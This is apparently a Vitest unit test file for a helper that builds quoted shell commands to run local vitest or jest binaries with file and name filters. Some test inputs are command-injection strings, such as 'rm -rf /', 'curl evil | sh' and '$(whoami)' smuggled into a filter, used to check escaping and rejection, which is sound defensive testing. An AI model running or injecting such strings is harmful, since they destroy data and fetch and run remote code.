import { describe, expect, it } from "vitest";
import { jsTestRunCommand } from "./jsTestCommand";

describe("jsTestRunCommand", () => {
  it("runs the local vitest binary with the run subcommand, never npx", () => {
    expect(jsTestRunCommand({ runner: "vitest" })).toBe(
      "node_modules/.bin/vitest run",
    );
  });

  it("runs the local jest binary without a subcommand", () => {
    expect(jsTestRunCommand({ runner: "jest" })).toBe("node_modules/.bin/jest");
  });

  it("appends a quoted file path", () => {
    expect(
      jsTestRunCommand({ filePath: "src/math.test.ts", runner: "vitest" }),
    ).toBe("node_modules/.bin/vitest run 'src/math.test.ts'");
    expect(
      jsTestRunCommand({ filePath: "src/my tests/math.test.ts", runner: "jest" }),
    ).toBe("node_modules/.bin/jest 'src/my tests/math.test.ts'");
  });

  it("appends a quoted -t filter after the file path", () => {
    expect(
      jsTestRunCommand({
        filePath: "src/math.test.ts",
        filter: "adds two numbers",
        runner: "vitest",
      }),
    ).toBe("node_modules/.bin/vitest run 'src/math.test.ts' -t 'adds two numbers'");
    expect(
      jsTestRunCommand({
        filePath: "src/math.test.ts",
        filter: "adds two numbers",
        runner: "jest",
      }),
    ).toBe("node_modules/.bin/jest 'src/math.test.ts' -t 'adds two numbers'");
  });

  it("builds a filter-only command when no file path is given", () => {
    expect(jsTestRunCommand({ filter: "adds", runner: "vitest" })).toBe(
      "node_modules/.bin/vitest run -t 'adds'",
    );
  });

  it("escapes embedded single quotes with the POSIX idiom", () => {
    expect(jsTestRunCommand({ filter: "it's fine", runner: "vitest" })).toBe(
      "node_modules/.bin/vitest run -t 'it'\\''s fine'",
    );
    expect(
      jsTestRunCommand({ filePath: "src/o'brien.test.ts", runner: "jest" }),
    ).toBe("node_modules/.bin/jest 'src/o'\\''brien.test.ts'");
  });

  it("neutralizes shell metacharacters in filters and paths", () => {
    expect(
      jsTestRunCommand({
        filter: "boom; rm -rf / && curl evil | sh `id` $(whoami)",
        runner: "vitest",
      }),
    ).toBe(
      "node_modules/.bin/vitest run -t 'boom; rm -rf / && curl evil | sh `id` $(whoami)'",
    );
  });

  it("returns null when the filter contains a newline or control character", () => {
    expect(
      jsTestRunCommand({ filter: "evil\nrm -rf /", runner: "vitest" }),
    ).toBeNull();
    expect(jsTestRunCommand({ filter: "tab\there", runner: "jest" })).toBeNull();
  });

  it("returns null when the file path contains a control character", () => {
    expect(
      jsTestRunCommand({ filePath: "src/evil\n.test.ts", runner: "vitest" }),
    ).toBeNull();
  });

  it("returns null for an empty filter or empty file path", () => {
    expect(jsTestRunCommand({ filter: "", runner: "vitest" })).toBeNull();
    expect(jsTestRunCommand({ filePath: "", runner: "jest" })).toBeNull();
  });

  it("treats a null filter and path as a whole-suite run", () => {
    expect(
      jsTestRunCommand({ filePath: null, filter: null, runner: "vitest" }),
    ).toBe("node_modules/.bin/vitest run");
  });
});
